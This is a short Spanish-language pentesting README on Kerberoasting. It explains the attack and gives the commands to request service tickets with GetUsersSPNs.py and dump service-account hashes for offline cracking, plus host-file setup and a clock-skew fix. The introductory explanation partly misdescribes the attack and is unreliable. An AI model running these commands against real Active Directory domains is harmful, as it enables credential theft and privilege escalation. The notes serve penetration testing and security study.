# Que es un ataque de Kerberoasting?
Kerberoasting es un ataque que se centra en obtener acceso a mas recursos mediante una escalada de privilegios, esto permite a los atacantes, hacerse pasar por usuarios del dominio sin privilegios con atributos `SPN` y solicitar tickets `TGS` relacionados con el servicio de la memoria en un intento de descifrar los hashes `NTLM`.

# Requisitos
Para evitar problemas debemos añadir al `/etc/hosts` lo siguiente, en el caso de este ataque con poner solo la ip y el nombre de dominio es suficiente.
```
<ip_DC> <nombre_dominio> <dominio> <nombre-DC>
```
Ejemplo:
```
192.168.214.149 wizcorp.local wizcorp DC-Company
```

# Efectuar ataque con GetUsersSPNs
Este ataque nos permite dumpear el hash de los usuarios que sean vulnerables.
```
python GetUsersSPNs.py <DOMINIO>/<usuario>:<contraseña> -dc-ip <ip_DC> -request
```
[Ver ejemplo](Images/users/README.md)

# Exportar hashes
En el caso de obtener un hash se pueden exportar directamente a un archivo con el parametro `-output <file>`

# Fix
Si el ataque te da el siguiente error: "Kerberos SessionERROR: KRB_AP_ERR_SKEW(Clock skew too great)" debes sincronizar la hora con el server de AD con el siguinte comando:
```
rdate -n <IP_DC>
```
